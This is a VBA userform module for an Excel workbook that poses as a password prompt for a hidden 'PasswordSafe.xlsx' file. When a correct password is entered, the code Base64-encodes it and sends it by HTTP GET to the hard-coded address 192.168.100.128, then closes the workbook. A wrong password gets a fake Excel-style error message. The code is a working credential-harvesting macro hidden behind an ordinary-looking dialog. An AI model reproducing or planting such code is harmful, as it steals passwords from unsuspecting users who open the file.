Private Sub CommandButton1_Click()
On Error Resume Next
Dim Path As String
Path = Application.ActiveWorkbook.Path
Dim src As Workbook
On Error GoTo WrongPWD
Set src = Workbooks.Open(Path + "\Hidden\PasswordSafe.xlsx", True, True, Password:=TextBox1.text)
ThisWorkbook.Activate
Worksheets("Sheet1") = src.Worksheets("sheet1")
WrongPWD:
  
    If Err.Number = 1004 Then
        MsgBox "The password you supplied is not correct. Verify that the CAPS LOCK key is off and be sure to use the correct capitalization.", vbExclamation, "Microsoft Excel"
    Else
        Dim xmlhttp As New MSXML2.xmlhttp60, myurl As String
        myurl = "http://192.168.100.128/" + EncodeBase64(TextBox1.text)
        xmlhttp.Open "GET", myurl, False
        xmlhttp.Send
        ActiveWorkbook.Close False
    End If
End Sub


Private Sub CommandButton2_Click()
Workbooks.Close
End Sub
Function EncodeBase64(text As String) As String
  Dim arrData() As Byte
  arrData = StrConv(text, vbFromUnicode)

  Dim objXML As MSXML2.DOMDocument60
  Dim objNode As MSXML2.IXMLDOMElement

  Set objXML = New MSXML2.DOMDocument60
  Set objNode = objXML.createElement("b64")

  objNode.DataType = "bin.base64"
  objNode.nodeTypedValue = arrData
  EncodeBase64 = objNode.text

  Set objNode = Nothing
  Set objXML = Nothing
End Function

Private Sub Label2_Click()

End Sub

Private Sub UserForm_Click()

End Sub
